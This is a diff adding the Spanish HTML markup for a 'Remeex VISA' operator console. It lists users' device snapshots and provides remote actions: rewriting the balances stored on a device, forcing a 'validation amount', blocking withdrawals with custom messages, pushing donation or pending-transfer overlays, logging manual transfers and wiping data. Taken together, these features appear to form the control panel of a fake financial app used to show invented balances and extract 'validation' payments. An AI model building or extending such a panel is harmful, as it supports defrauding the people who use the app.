@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Remeex VISA · Consola Mi Información</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="admin-miinformacion.css" />
+  </head>
+  <body>
+    <div class="layout">
+      <aside class="sidebar">
+        <div class="sidebar__header">
+          <div>
+            <p class="sidebar__eyebrow">Remeex VISA</p>
+            <h1 class="sidebar__title">Consola de sincronización</h1>
+            <p class="sidebar__subtitle">
+              Supervisión avanzada de snapshots y acciones remotas generadas desde
+              <strong>miinformacion.html</strong>.
+            </p>
+          </div>
+          <div class="status-card" id="supabase-status" data-status="offline">
+            <span class="status-card__dot"></span>
+            <div class="status-card__copy">
+              <span class="status-card__label">Sin conectar</span>
+              <span class="status-card__meta">Esperando inicialización</span>
+            </div>
+          </div>
+        </div>
+        <div class="sidebar__section">
+          <label class="sidebar__field">
+            <span class="sidebar__field-label">Identificador de operador</span>
+            <input
+              type="text"
+              id="operator-name"
+              placeholder="Ej: soporte@remeexvisa.com"
+              autocomplete="off"
+            />
+            <small class="sidebar__field-hint">
+              Se añadirá a los metadatos de cada comando que envíes.
+            </small>
+          </label>
+        </div>
+        <div class="sidebar__section sidebar__section--meta">
+          <h2 class="sidebar__section-title">Estado general</h2>
+          <dl class="meta-grid" id="global-metrics">
+            <div>
+              <dt>Snapshots registrados</dt>
+              <dd data-metric="snapshots">–</dd>
+            </div>
+            <div>
+              <dt>Usuarios activos</dt>
+              <dd data-metric="users">–</dd>
+            </div>
+            <div>
+              <dt>Última sincronización</dt>
+              <dd data-metric="last-sync">–</dd>
+            </div>
+            <div>
+              <dt>Acciones remotas</dt>
+              <dd data-metric="commands">–</dd>
+            </div>
+          </dl>
+        </div>
+        <div class="sidebar__section">
+          <button class="button button--ghost" id="refresh-all" type="button">
+            <span>Actualizar datos</span>
+            <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+              <path
+                fill="currentColor"
+                d="M12 5a7 7 0 0 1 6.93 6.06a1 1 0 0 0 1-.88A9 9 0 1 0 4.06 6.07L2.7 7.41A1 1 0 0 0 4.12 8.83L7.71 5.3a1 1 0 0 0 0-1.42L4.12.71A1 1 0 0 0 2.7 2.12L4.06 3.5A9 9 0 0 1 21 12a1 1 0 1 0 2 0A11 11 0 1 0 2 12a1 1 0 0 0 2 0A7 7 0 0 1 12 5"
+              />
+            </svg>
+          </button>
+        </div>
+      </aside>
+      <main class="content">
+        <section class="panel panel--list">
+          <header class="panel__header">
+            <div>
+              <h2>Usuarios sincronizados</h2>
+              <p>Snapshots más recientes agrupados por correo o dispositivo.</p>
+            </div>
+            <div class="panel__actions">
+              <label class="search-field">
+                <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                  <path
+                    fill="currentColor"
+                    d="M11 2a9 9 0 0 1 6.32 15.32l4.18 4.18a1 1 0 0 1-1.42 1.42l-4.18-4.18A9 9 0 1 1 11 2m0 2a7 7 0 1 0 4.95 11.95A7 7 0 0 0 11 4"
+                  />
+                </svg>
+                <input
+                  id="user-search"
+                  type="search"
+                  placeholder="Buscar por nombre, correo, documento o dispositivo"
+                  autocomplete="off"
+                />
+              </label>
+              <select id="user-filter" class="select">
+                <option value="all">Todos los estados</option>
+                <option value="validated">Solo validados</option>
+                <option value="pending">Sin validar</option>
+                <option value="blocked">Bloqueados</option>
+              </select>
+            </div>
+          </header>
+          <div class="panel__body">
+            <ul class="user-list" id="user-list" aria-live="polite"></ul>
+            <div class="empty" id="user-empty" hidden>
+              <p>No se encontraron usuarios con los filtros aplicados.</p>
+            </div>
+          </div>
+        </section>
+        <section class="panel panel--detail">
+          <header class="panel__header">
+            <div>
+              <h2>Detalle del usuario</h2>
+              <p>Selecciona un usuario de la lista para explorar sus snapshots y ejecutar acciones remotas.</p>
+            </div>
+            <div class="panel__status" id="detail-status" hidden></div>
+          </header>
+          <div class="panel__body panel__body--detail">
+            <div class="detail-empty" id="detail-empty">
+              <div class="detail-empty__card">
+                <h3>Selecciona un usuario</h3>
+                <p>
+                  Encuentra el dispositivo o correo que deseas auditar en la lista y podrás ver la información recopilada
+                  desde <strong>miinformacion.html</strong>.
+                </p>
+              </div>
+            </div>
+            <div class="detail" id="detail" hidden>
+              <section class="detail__header" id="detail-header"></section>
+              <section class="detail__grid" id="detail-summary"></section>
+              <section class="detail__actions">
+                <h3>Acciones remotas</h3>
+                <div class="action-grid">
+                  <form class="action-card" id="form-update-balance">
+                    <h4>Actualizar saldo</h4>
+                    <p>Reescribe los montos guardados en el dispositivo.</p>
+                    <div class="field-grid field-grid--2">
+                      <label>
+                        <span>Saldo USD</span>
+                        <input type="text" inputmode="decimal" id="balance-usd" placeholder="120.00" />
+                      </label>
+                      <label>
+                        <span>Saldo Bs</span>
+                        <input type="text" inputmode="decimal" id="balance-bs" placeholder="4500.00" />
+                      </label>
+                      <label>
+                        <span>Saldo EUR</span>
+                        <input type="text" inputmode="decimal" id="balance-eur" placeholder="75.00" />
+                      </label>
+                      <label>
+                        <span>Saldo USDT</span>
+                        <input type="text" inputmode="decimal" id="balance-usdt" placeholder="30.00" />
+                      </label>
+                    </div>
+                    <div class="action-card__footer">
+                      <button class="button button--primary" type="submit">Sincronizar saldo</button>
+                      <button class="button button--ghost" type="button" id="fill-current-balance">Usar snapshot</button>
+                    </div>
+                  </form>
+                  <form class="action-card" id="form-update-rate">
+                    <h4>Actualizar tasa</h4>
+                    <p>Define la tasa principal y conversión EUR para HomeVisa.</p>
+                    <label>
+                      <span>Tasa principal</span>
+                      <select id="rate-key" class="select">
+                        <option value="bcv">BCV</option>
+                        <option value="usdt">USDT P2P</option>
+                        <option value="euroDigital">Euro Digital</option>
+                        <option value="dolarPromedio">Dólar promedio</option>
+                        <option value="dolarBinance">Dólar Binance</option>
+                        <option value="exchange">Intercambio Remeex</option>
+                        <option value="personalizado">Tasa personalizada</option>
+                      </select>
+                    </label>
+                    <div class="field-grid field-grid--2">
+                      <label>
+                        <span>Valor USD ↔ Bs</span>
+                        <input type="text" inputmode="decimal" id="rate-value" placeholder="37,50" />
+                      </label>
+                      <label>
+                        <span>USD ↔ EUR</span>
+                        <input type="text" inputmode="decimal" id="rate-eur" placeholder="0.93" />
+                      </label>
+                    </div>
+                    <div class="action-card__footer">
+                      <button class="button button--primary" type="submit">Aplicar tasa</button>
+                      <button class="button button--ghost" type="button" id="clear-rate">Limpiar</button>
+                    </div>
+                  </form>
+                  <form class="action-card" id="form-validation">
+                    <h4>Monto de validación</h4>
+                    <p>Forzar o limpiar el monto mínimo de validación remota.</p>
+                    <label>
+                      <span>Monto USD</span>
+                      <input type="text" inputmode="decimal" id="validation-amount" placeholder="25.00" />
+                    </label>
+                    <div class="action-card__footer">
+                      <button class="button button--primary" type="submit">Establecer monto</button>
+                      <button class="button button--ghost" type="button" id="clear-validation">Quitar restricción</button>
+                    </div>
+                  </form>
+                  <form class="action-card" id="form-block">
+                    <h4>Bloqueo manual</h4>
+                    <p>Controla las restricciones visibles desde HomeVisa.</p>
+                    <label>
+                      <span>Tipo de bloqueo</span>
+                      <select id="block-type" class="select">
+                        <option value="general">General</option>
+                        <option value="validation">Validación pendiente</option>
+                        <option value="security">Alerta de seguridad</option>
+                        <option value="payments">Pagos limitados</option>
+                        <option value="withdrawals">Retiros limitados</option>
+                      </select>
+                    </label>
+                    <label>
+                      <span>Mensaje visible</span>
+                      <textarea id="block-message" rows="3" placeholder="Motivo del bloqueo"></textarea>
+                    </label>
+                    <div class="action-card__footer">
+                      <button class="button button--danger" type="submit">Aplicar bloqueo</button>
+                      <button class="button button--ghost" type="button" id="clear-block">Desbloquear</button>
+                    </div>
+                  </form>
+                  <form class="action-card" id="form-overlay">
+                    <h4>Overlay remoto</h4>
+                    <p>Muestra un aviso de alta prioridad sobre HomeVisa.</p>
+                    <label>
+                      <span>Plantilla base</span>
+                      <select id="overlay-template" class="select">
+                        <option value="donation">Campaña de donación</option>
+                        <option value="activation">Recordatorio de activación</option>
+                        <option value="transfer">Transferencia pendiente</option>
+                        <option value="custom">Personalizado</option>
+                      </select>
+                    </label>
+                    <label>
+                      <span>Título</span>
+                      <input type="text" id="overlay-title" placeholder="Título del mensaje" />
+                    </label>
+                    <label>
+                      <span>Mensaje</span>
+                      <textarea id="overlay-message" rows="3" placeholder="Contenido principal"></textarea>
+                    </label>
+                    <div class="field-grid field-grid--2">
+                      <label>
+                        <span>Color de acento</span>
+                        <input type="text" id="overlay-accent" placeholder="#38bdf8" />
+                      </label>
+                      <label>
+                        <span>Texto botón</span>
+                        <input type="text" id="overlay-button-label" placeholder="Ver detalles" />
+                      </label>
+                    </div>
+                    <label>
+                      <span>URL botón</span>
+                      <input type="url" id="overlay-button-url" placeholder="https://remeexvisa.com/" />
+                    </label>
+                    <div class="action-card__footer">
+                      <button class="button button--primary" type="submit">Mostrar overlay</button>
+                      <button class="button button--ghost" type="button" id="hide-overlay">Ocultar overlay</button>
+                    </div>
+                  </form>
+                  <form class="action-card" id="form-send-funds">
+                    <h4>Transferencia remota</h4>
+                    <p>Registra transferencias manuales entre usuarios.</p>
+                    <label>
+                      <span>Acción</span>
+                      <select id="transfer-direction" class="select">
+                        <option value="send">Enviar fondos</option>
+                        <option value="receive">Recibir fondos</option>
+                      </select>
+                    </label>
+                    <label>
+                      <span>Correo contraparte</span>
+                      <input type="email" id="transfer-email" placeholder="usuario@correo.com" autocomplete="off" />
+                    </label>
+                    <div class="field-grid field-grid--2">
+                      <label>
+                        <span>Monto</span>
+                        <input type="text" inputmode="decimal" id="transfer-amount" placeholder="100.00" />
+                      </label>
+                      <label>
+                        <span>Moneda</span>
+                        <select id="transfer-currency" class="select">
+                          <option value="usd">USD</option>
+                          <option value="ves">VES / Bs</option>
+                          <option value="eur">EUR</option>
+                          <option value="usdt">USDT</option>
+                        </select>
+                      </label>
+                    </div>
+                    <label>
+                      <span>Referencia</span>
+                      <input type="text" id="transfer-reference" placeholder="REM-2024-001" />
+                    </label>
+                    <label>
+                      <span>Nota visible</span>
+                      <textarea id="transfer-note" rows="3" placeholder="Motivo o contexto"></textarea>
+                    </label>
+                    <div class="action-card__footer">
+                      <button class="button button--primary" type="submit">Registrar transferencia</button>
+                    </div>
+                  </form>
+                  <div class="action-card action-card--danger">
+                    <h4>Restablecer cuenta</h4>
+                    <p>Elimina todos los datos locales almacenados en el dispositivo y reinicia la sesión.</p>
+                    <button class="button button--danger" id="wipe-account" type="button">
+                      Eliminar datos locales
+                    </button>
+                  </div>
+                </div>
+              </section>
+              <section class="detail__history">
+                <div class="history-card">
+                  <h3>Historial de snapshots</h3>
+                  <ol class="history-list" id="snapshot-history"></ol>
+                </div>
+                <div class="history-card">
+                  <h3>Acciones remotas registradas</h3>
+                  <ol class="history-list" id="command-history"></ol>
+                </div>
+              </section>
+            </div>
+          </div>
+        </section>
+      </main>
+    </div>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+    <script type="module" src="admin-miinformacion.js" defer></script>
+  </body>
+</html>
